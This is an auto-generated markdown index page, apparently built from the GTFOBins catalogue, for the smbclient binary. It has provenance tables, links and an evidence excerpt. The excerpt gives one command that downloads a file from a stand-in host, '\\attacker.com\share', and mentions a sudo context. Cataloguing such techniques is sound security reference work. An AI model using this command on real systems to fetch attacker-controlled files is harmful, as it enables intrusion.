---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# smbclient

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `smbclient` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/smbclient` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for smbclient covering download, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/smbclient.md)
- Source verification: [source record](../../sources/gtfobins/smbclient.md)

## Aliases

- `smbclient`

## Source Verification

[source record](../../sources/gtfobins/smbclient.md)

## Evidence Excerpt

```text
_body: ''
_name: smbclient
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/smbclient
functions:
download:
- code: smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
contexts:
sudo: null
```
